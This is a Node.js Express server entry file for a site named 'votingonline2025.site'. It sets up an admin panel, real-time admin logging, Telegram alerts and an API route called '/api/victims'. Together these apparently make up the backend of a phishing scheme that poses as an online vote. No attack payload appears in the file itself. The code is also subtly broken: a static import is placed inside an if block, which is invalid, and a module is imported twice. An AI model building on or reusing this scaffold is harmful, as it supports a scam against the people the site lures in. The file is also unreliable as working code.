#!/usr/bin/env node

/**
 * Production Server - VPS Deployment
 * Main production entry point
 */

import dotenv from "dotenv";
import express from "express";
import cors from "cors";
import helmet from "helmet";
import compression from "compression";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";
import { fileURLToPath } from "url";

// Load production environment
dotenv.config({ path: "./production/.env.production" });

// Import production modules
import { initializeProductionSystem } from "../app.js";
import productionDB from "./database.js";
import telegramNotifier from "./telegram.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

class ProductionServer {
  constructor() {
    this.app = express();
    this.server = null;
    this.io = null;
    this.productionSystem = null;

    this.config = {
      port: process.env.PORT || 3000,
      apiPort: process.env.ADMIN_PORT || 3001,
      environment: process.env.NODE_ENV || "production",
      domain: process.env.DOMAIN || "votingonline2025.site",
    };
  }

  // Initialize production server
  async initialize() {
    try {
      console.log("🚀 Initializing Production Server...");
      console.log("=====================================");
      console.log(`🌐 Domain: ${this.config.domain}`);
      console.log(`🔧 Environment: ${this.config.environment}`);
      console.log(`🚪 Port: ${this.config.port}`);

      // Initialize database first
      await this.initializeDatabase();

      // Setup Express application
      await this.setupExpress();

      // Initialize production system
      await this.initializeProductionSystem();

      // Setup Socket.IO
      await this.setupSocketIO();

      // Setup routes
      await this.setupRoutes();

      // Setup error handling
      await this.setupErrorHandling();

      console.log("✅ Production Server initialized successfully");
      return true;
    } catch (error) {
      console.error("❌ Production Server initialization failed:", error);
      return false;
    }
  }

  // Initialize database connection
  async initializeDatabase() {
    console.log("🗄️ Connecting to production database...");

    const dbConnected = await productionDB.initialize();
    if (!dbConnected) {
      throw new Error("Database connection failed");
    }

    console.log("✅ Production database connected");
  }

  // Setup Express application
  async setupExpress() {
    console.log("⚙️ Setting up Express server...");

    // Security middleware
    this.app.use(
      helmet({
        contentSecurityPolicy: {
          directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https:"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https:"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "wss:", "https:"],
          },
        },
      })
    );

    // CORS configuration
    this.app.use(
      cors({
        origin: [
          `https://${this.config.domain}`,
          `https://www.${this.config.domain}`,
          `https://admin.${this.config.domain}`,
          `https://api.${this.config.domain}`,
          process.env.NODE_ENV === "development"
            ? "http://localhost:3000"
            : null,
        ].filter(Boolean),
        credentials: true,
        methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        allowedHeaders: ["Content-Type", "Authorization"],
      })
    );

    // Compression
    this.app.use(compression());

    // Body parsing
    this.app.use(express.json({ limit: "10mb" }));
    this.app.use(express.urlencoded({ extended: true, limit: "10mb" }));

    // Trust proxy for VPS deployment
    this.app.set("trust proxy", 1);

    // Request logging
    this.app.use((req, res, next) => {
      console.log(
        `${new Date().toISOString()} - ${req.method} ${req.path} - ${req.ip}`
      );
      req.startTime = Date.now();
      next();
    });

    console.log("✅ Express middleware configured");
  }

  // Initialize production system
  async initializeProductionSystem() {
    console.log("🎯 Initializing Production System...");

    this.productionSystem = await initializeProductionSystem();

    // Make system available to routes
    this.app.set("productionSystem", this.productionSystem);
    this.app.set("database", productionDB);

    console.log("✅ Production System ready");
  }

  // Setup Socket.IO
  async setupSocketIO() {
    console.log("🔌 Setting up Socket.IO...");

    this.server = createServer(this.app);

    this.io = new Server(this.server, {
      cors: {
        origin: [
          `https://${this.config.domain}`,
          `https://admin.${this.config.domain}`,
        ],
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
    });

    // Socket.IO connection handling
    this.io.on("connection", (socket) => {
      console.log(`🔌 New socket connection: ${socket.id}`);

      socket.on("disconnect", () => {
        console.log(`🔌 Socket disconnected: ${socket.id}`);
      });

      // Admin real-time logging
      socket.on("admin:enable-realtime", (data) => {
        socket.join("admin-realtime");
        console.log("👨‍💼 Admin enabled real-time logging");
      });

      socket.on("admin:disable-realtime", () => {
        socket.leave("admin-realtime");
        console.log("👨‍💼 Admin disabled real-time logging");
      });
    });

    // Make Socket.IO available globally
    this.app.set("io", this.io);
    global.socketIO = this.io;

    console.log("✅ Socket.IO configured");
  }

  // Setup routes
  async setupRoutes() {
    console.log("🛣️ Setting up routes...");

    // Health check endpoint
    this.app.get("/health", async (req, res) => {
      try {
        const healthData = {
          status: "healthy",
          timestamp: new Date().toISOString(),
          uptime: process.uptime(),
          memory: process.memoryUsage(),
          environment: this.config.environment,
          domain: this.config.domain,
          database: await productionDB.getHealthStatus(),
          system: this.productionSystem ? "running" : "not_initialized",
        };

        res.json(healthData);
      } catch (error) {
        res.status(500).json({
          status: "unhealthy",
          error: error.message,
          timestamp: new Date().toISOString(),
        });
      }
    });

    // API routes
    this.app.use("/api", await this.loadAPIRoutes());

    // Serve static files
    this.setupStaticFiles();

    // Catch-all route for SPA
    this.app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "user/dist/index.html"));
    });

    console.log("✅ Routes configured");
  }

  // Load API routes
  async loadAPIRoutes() {
    const apiRouter = express.Router();

    try {
      // Import API routes
      const { default: adminHistoryRoutes } = await import(
        "./backend/routes/admin.js"
      );
      const { default: authRoutes } = await import("./backend/routes/auth.js");
      const { default: userRoutes } = await import("./backend/routes/user.js");
      const { default: victimRoutes } = await import(
        "./backend/routes/victims.js"
      );
      const { default: systemRoutes } = await import(
        "./backend/routes/system.js"
      );

      // Mount routes
      apiRouter.use("/admin", adminHistoryRoutes);
      apiRouter.use("/auth", authRoutes);
      apiRouter.use("/user", userRoutes);
      apiRouter.use("/victims", victimRoutes);
      apiRouter.use("/system", systemRoutes);

      // System health endpoint
      apiRouter.get("/system/health", async (req, res) => {
        try {
          const health = this.productionSystem
            ? this.productionSystem.getHealthStatus()
            : { status: "not_initialized" };

          res.json({
            success: true,
            data: health,
            timestamp: new Date().toISOString(),
          });
        } catch (error) {
          res.status(500).json({
            success: false,
            error: error.message,
          });
        }
      });

      // Database health endpoint
      apiRouter.get("/system/database-health", async (req, res) => {
        try {
          const dbHealth = await productionDB.getHealthStatus();
          res.json({
            success: true,
            data: dbHealth,
          });
        } catch (error) {
          res.status(500).json({
            success: false,
            error: error.message,
          });
        }
      });

      console.log("✅ API routes loaded");
      return apiRouter;
    } catch (error) {
      console.error("❌ Failed to load API routes:", error);

      // Return minimal router with error endpoint
      apiRouter.get("*", (req, res) => {
        res.status(503).json({
          success: false,
          error: "API temporarily unavailable",
          message: "Routes failed to load",
        });
      });

      return apiRouter;
    }
  }

  // Setup static file serving
  setupStaticFiles() {
    // Admin panel static files
    this.app.use(
      "/admin",
      express.static(path.join(__dirname, "admin/dist"), {
        maxAge: "1h",
        etag: true,
        lastModified: true,
      })
    );

    // User interface static files
    this.app.use(
      express.static(path.join(__dirname, "user/dist"), {
        maxAge: "1h",
        etag: true,
        lastModified: true,
      })
    );

    // Upload files
    this.app.use(
      "/uploads",
      express.static(process.env.UPLOAD_DIR || "./uploads", {
        maxAge: "1d",
      })
    );

    console.log("📁 Static file serving configured");
  }

  // Setup error handling
  async setupErrorHandling() {
    // 404 handler
    this.app.use((req, res) => {
      res.status(404).json({
        success: false,
        error: "Not found",
        path: req.path,
        timestamp: new Date().toISOString(),
      });
    });

    // Global error handler
    this.app.use(async (error, req, res, next) => {
      console.error("💥 Server error:", error);

      // Send error notification
      try {
        await telegramNotifier.sendErrorNotification(error, req.path);
      } catch (notifyError) {
        console.error("Failed to send error notification:", notifyError);
      }

      res.status(500).json({
        success: false,
        error:
          process.env.NODE_ENV === "production"
            ? "Internal server error"
            : error.message,
        timestamp: new Date().toISOString(),
      });
    });

    console.log("✅ Error handling configured");
  }

  // Start production server
  async start() {
    try {
      if (!this.server) {
        console.error("❌ Server not initialized");
        return false;
      }

      this.server.listen(this.config.port, async () => {
        // Production Sync System
        if (process.env.ENABLE_SYNC !== "false") {
          try {
            const SyncIntegration = (
              await import("../backend/sync-integration.js")
            ).default;
            this.syncIntegration = new SyncIntegration(this.server);
            console.log("🔄 Production sync system active");

            // Store reference for API access
            global.productionSyncIntegration = this.syncIntegration;
          } catch (error) {
            console.error("⚠️ Production sync system failed:", error.message);
            console.log("ℹ️ Continuing without sync system...");
          }
        } else {
          console.log("ℹ️ Production sync system disabled");
        }

        console.log("");
        console.log("🎉 PRODUCTION SERVER STARTED!");
        console.log("============================");
        console.log(`🌐 Domain: https://${this.config.domain}`);
        console.log(`🚪 Port: ${this.config.port}`);
        console.log(`⚙️ Environment: ${this.config.environment}`);
        console.log(`📊 Admin Panel: https://admin.${this.config.domain}`);
        console.log(`🔌 Socket.IO: Ready`);
        console.log(`🗄️ Database: Connected`);
        console.log("");

        // Send startup notification
        telegramNotifier.sendStartupNotification().catch(console.error);
      });

      return true;
    } catch (error) {
      console.error("❌ Failed to start server:", error);
      return false;
    }
  }

  // Graceful shutdown
  async shutdown() {
    console.log("🛑 Shutting down production server...");

    try {
      // Close Socket.IO
      if (this.io) {
        this.io.close();
      }

      // Close HTTP server
      if (this.server) {
        this.server.close();
      }

      // Close database connection
      if (productionDB) {
        await productionDB.close();
      }

      // Shutdown production system
      if (this.productionSystem) {
        await this.productionSystem.shutdown();
      }

      console.log("✅ Production server shut down gracefully");
    } catch (error) {
      console.error("❌ Error during shutdown:", error);
    }
  }
}

// Main execution
if (import.meta.url === `file://${process.argv[1]}`) {
  // Production Sync Integration
  import SyncIntegration from "../backend/sync-integration.js";
  const server = new ProductionServer();

  server.initialize().then(async (success) => {
    if (success) {
      const started = await server.start();
      if (!started) {
        process.exit(1);
      }
    } else {
      console.error("❌ Failed to initialize production server");
      process.exit(1);
    }
  });

  // Graceful shutdown handlers
  process.on("SIGTERM", async () => {
    console.log("📡 SIGTERM received, shutting down gracefully...");
    await server.shutdown();
    process.exit(0);
  });

  process.on("SIGINT", async () => {
    console.log("📡 SIGINT received, shutting down gracefully...");
    await server.shutdown();
    process.exit(0);
  });

  process.on("uncaughtException", async (error) => {
    console.error("💥 Uncaught Exception:", error);
    await server.shutdown();
    process.exit(1);
  });

  process.on("unhandledRejection", async (reason, promise) => {
    console.error("💥 Unhandled Rejection at:", promise, "reason:", reason);
    await server.shutdown();
    process.exit(1);
  });
}

export default ProductionServer;
